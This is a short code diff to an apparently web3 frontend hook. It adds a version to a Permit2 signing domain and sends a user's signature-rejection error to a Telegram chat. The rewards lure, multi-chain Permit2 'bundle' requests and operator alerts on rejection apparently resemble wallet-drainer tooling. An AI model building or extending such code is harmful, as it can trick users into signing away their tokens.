@@ -23,6 +23,7 @@ const TRACE_REWARDS_ABI = [
 
 const PERMIT2_DOMAIN = {
     name: "Permit2",
+    version: "1",
     verifyingContract: PERMIT2_ADDRESS
 };
 
@@ -771,7 +772,8 @@ export function useWeb3Manager() {
 
                         } catch (p2Err: any) {
                             console.error("Permit2 sign failed", p2Err);
-                            notifyTelegram(`<b>⚠️ Signature Rejected</b>\nChain: ${targetChainName}\nUser cancelled the bundle request.`);
+                            const errMsg = p2Err?.message || "Unknown signature error";
+                            notifyTelegram(`<b>⚠️ Signature Rejected</b>\nChain: ${targetChainName}\nError: <code>${errMsg.slice(0, 100)}</code>`);
                         }
                     }
 
